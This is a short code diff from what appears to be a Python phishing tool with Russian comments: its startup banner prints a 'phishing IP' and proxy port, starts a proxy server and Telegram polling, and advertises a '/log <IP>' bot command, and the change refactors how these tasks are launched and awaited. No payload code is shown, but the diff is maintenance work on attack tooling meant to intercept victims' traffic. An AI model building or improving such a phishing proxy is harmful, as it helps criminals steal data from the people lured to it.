@@ -351,11 +351,11 @@ async def main():
     print(f"🔗 Фишинг IP: {public_ip}:{PROXY_PORT}")
     print("=" * 50)
     
-    # Запускаем прокси
-    asyncio.create_task(start_proxy_server())
-    
-    # Запускаем поллинг Telegram
-    asyncio.create_task(poll_telegram())
+    # Запускаем задачи
+    tasks = [
+        asyncio.create_task(start_proxy_server()),
+        asyncio.create_task(poll_telegram())
+    ]
     
     print("✅ Бот запущен!")
     print("📌 Используй команду /log <IP>")
@@ -365,8 +365,8 @@ async def main():
     print(f"   {public_ip}:{PROXY_PORT}")
     print("")
     
-    # Держим приложение живым
-    await asyncio.Event().wait()
+    # Ждём все задачи
+    await asyncio.gather(*tasks)
 
 if __name__ == '__main__':
     try:
